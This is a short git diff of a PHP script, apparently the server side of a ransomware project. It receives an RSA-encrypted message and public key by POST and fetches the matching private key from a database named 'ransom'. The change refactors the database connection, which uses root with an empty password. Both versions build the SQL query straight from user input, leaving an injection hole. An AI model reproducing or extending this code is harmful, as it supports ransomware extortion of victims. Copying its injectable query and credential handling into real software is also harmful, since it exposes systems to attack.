@@ -1,5 +1,6 @@
 <?php
 include 'lib/Crypt/RSA.php';
+include 'database.php';
 //we get a post with an rsa encrypted message and a public key used
 if(isset($_POST['rsa_message']) && isset($_POST['rsa_pukey'])){
 	$rsa = new Crypt_RSA();
@@ -14,8 +15,7 @@ if(isset($_POST['rsa_message']) && isset($_POST['rsa_pukey'])){
     * we need to find the private key corresponding in the database
     * sql connection and request
     * use of the key to decrypt*/
-    $con=mysqli_connect("localhost","root","","ransom");
-	$result = $con->query("SELECT private_key from db_keys where public_key='".$_POST['rsa_pukey']."'");
+	$result = connect("root","")->query("SELECT private_key from db_keys where public_key='".$_POST['rsa_pukey']."'");
 	foreach ($result as $row) {
 		$tmp_prkey=$row['private_key'];
 		$rsa->loadKey($tmp_prkey);
